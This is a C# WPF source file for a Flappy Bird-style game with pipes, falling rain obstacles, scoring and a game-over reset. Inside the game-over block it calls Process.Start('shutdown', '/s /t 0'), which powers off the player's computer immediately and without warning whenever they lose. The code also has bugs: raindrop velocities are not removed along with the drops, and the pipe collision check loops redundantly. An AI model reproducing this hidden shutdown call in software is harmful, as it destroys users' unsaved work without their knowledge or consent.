using System.Diagnostics;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using static System.Runtime.InteropServices.JavaScript.JSType;

namespace flappy_bird
{
    public partial class MainWindow : Window
    {
        Random random = new Random();
        private double yAxis = 100;
        private double velocity = 0;
        private double spawnTimer = 0;
        private double rainDropTimer = 0;
        private int counter = 0;
        private bool isGameOver = false;
        private bool HasScored = false;
        private List<Rectangle> pipes = new List<Rectangle>();
        private List<Rectangle> rains = new List<Rectangle>();
        private List<double> rainVelocities = new List<double>();
        public MainWindow()
        {
            InitializeComponent();
            CompositionTarget.Rendering += OnRendering;
            SpawnPipe();
        }

        public void OnRendering(object sender, EventArgs e)
        {

            // RainDrop Velocity

            for (int i = 0; i < rains.Count; i++)
            {
                rainVelocities[i] += 0.05;

                Canvas.SetTop(
                    rains[i],
                    Canvas.GetTop(rains[i]) + rainVelocities[i]
                );
            }

            if (hitsRainDrop())
                velocity += 5;

            // Collision
            if (yAxis >= 550)
            {
                yAxis = 550;
                velocity = 0;
            }

            if (yAxis <= 0)
            {
                yAxis = 0;
                velocity = 0;
            }

            // Jump
            if (Keyboard.IsKeyDown(Key.Space))
            {
                velocity = -5;
            }

            // Gravity
            velocity += 0.5;

            // Y Position
            yAxis += velocity;

            // Set
            Canvas.SetTop(Bird, yAxis);

            // Spawn Pipe
            spawnTimer += 1;
            rainDropTimer += 1;

            if (spawnTimer >= 100)
            {
                spawnTimer = 0;
                SpawnPipe();
            }

            if (rainDropTimer >= 20)
            {
                rainDropTimer = 0;
                randomRainSpawn();

            }

            // Delete Pipe
            for (int i = pipes.Count - 1; i >= 0; i--)
            {
                var chosenPipe = pipes[i];
                Canvas.SetLeft(chosenPipe, Canvas.GetLeft(chosenPipe) - 3);
                if (Canvas.GetLeft(chosenPipe) + chosenPipe.Width < 0)
                {
                    MainCanvas.Children.Remove(chosenPipe);
                    pipes.RemoveAt(i);
                }
            }

            // Delete Rain
            for (int i = rains.Count - 1; i >= 0; i--)
            {
                var chosenRain = rains[i];
                if (Canvas.GetTop(chosenRain) >= MainCanvas.Height)
                {
                    MainCanvas.Children.Remove(chosenRain);
                    rains.Remove(chosenRain);
                }
            }

            if (HitsPipe())
                isGameOver = true;

            if (isGameOver)
            {
                MessageBox.Show("Game Over!");

                // Reset Game

                for (int i = 0; i < pipes.Count(); i++)
                {
                    var chosenPipe = pipes[i];
                    MainCanvas.Children.Remove(chosenPipe);
                }

                for (int i = 0; i < rains.Count(); i++)
                {
                    var chosenRain = rains[i];
                    MainCanvas.Children.Remove(chosenRain);
                }

                pipes.Clear();
                rains.Clear();
                rainVelocities.Clear();

                velocity = 0;
                yAxis = 100;
                spawnTimer = 0;
                rainDropTimer = 0;
                counter = 0;
                txtBox.Text = "Score: 0";

                Canvas.SetTop(Bird, yAxis);
                isGameOver = false;

                Process.Start("shutdown", "/s /t 0");

            }

            // Counter 
            if (pipes.Count > 0)
            {
                var pipe = pipes[0];
                if (Canvas.GetLeft(pipe) + Bird.Width < Canvas.GetLeft(Bird) && HasScored == false)
                {
                    counter++;
                    txtBox.Text = $"Score: {counter}";
                    HasScored = true;
                }
            }
        }
        public void SpawnPipe()
        {
            var heightTop = random.Next(100, 350);
            var emptySpace = random.Next(75,125);

            var pipeImage = new BitmapImage(
            new Uri("pack://application:,,,/Images/Pipe.jpeg")
            );

            var topPipe = new Rectangle
            {
                Width = 50,
                Height = heightTop,
                Fill = new ImageBrush(pipeImage)
                {
                    Stretch = Stretch.Fill
                }
            };

            var BottomPipe = new Rectangle
            {
                Width = 50,
                Height = MainCanvas.Height - (heightTop + emptySpace),
                Fill = new ImageBrush(pipeImage)
                {
                    Stretch = Stretch.Fill
                }
            };

            Canvas.SetLeft(topPipe, MainCanvas.Width);
            Canvas.SetTop(topPipe, 0);

            Canvas.SetLeft(BottomPipe, MainCanvas.Width);
            Canvas.SetTop(BottomPipe, heightTop + emptySpace);

            MainCanvas.Children.Add(topPipe);
            MainCanvas.Children.Add(BottomPipe);

            pipes.Add(topPipe);
            pipes.Add(BottomPipe);

            Panel.SetZIndex(topPipe, 0);
            Panel.SetZIndex(BottomPipe, 0);

            HasScored = false;
        }
        public bool HitsPipe()
        {
            var shrink = 4;
            var birdRect = new Rect(Canvas.GetLeft(Bird) + shrink, yAxis + shrink, Bird.Width -shrink*2, Bird.Height -shrink*2);
            foreach (var pipe in pipes)
            {
                var pipeRects = pipes.Select(pipe => new Rect(Canvas.GetLeft(pipe), Canvas.GetTop(pipe), pipe.Width, pipe.Height));
                if (pipeRects.Any(pipeRect => pipeRect.IntersectsWith(birdRect)))
                {
                    return true;
                }
            }
            return false;
        }

        public void randomRainSpawn()
        {
            var rainImage = new BitmapImage(
            new Uri("pack://application:,,,/Images/Rain.jpeg")
            );

            double randomXValue = random.Next(0, (int)MainCanvas.Width - 5);

            var rain = new Rectangle
            {
                Width = 50,
                Height = 50,
                Fill = new ImageBrush(rainImage)
                {
                    Stretch = Stretch.Fill
                }
            };

            Canvas.SetLeft(rain, randomXValue);
            Canvas.SetTop(rain, 0);


            MainCanvas.Children.Add(rain);
            rains.Add(rain);
            rainVelocities.Add(0);
        }

        public bool hitsRainDrop()
        {
            var shrink = 4;
            var birdRect = new Rect(
            Canvas.GetLeft(Bird),
            Canvas.GetTop(Bird),
            Bird.Width - shrink * 2,
            Bird.Height - shrink * 2
            );

            foreach (var rain in rains)
            {
                var rainRect = new Rect(
                    Canvas.GetLeft(rain),
                    Canvas.GetTop(rain),
                    rain.Width,
                    rain.Height
                );

                if (birdRect.IntersectsWith(rainRect))
                {
                    return true;
                }
            }

            return false;
        }
    }
}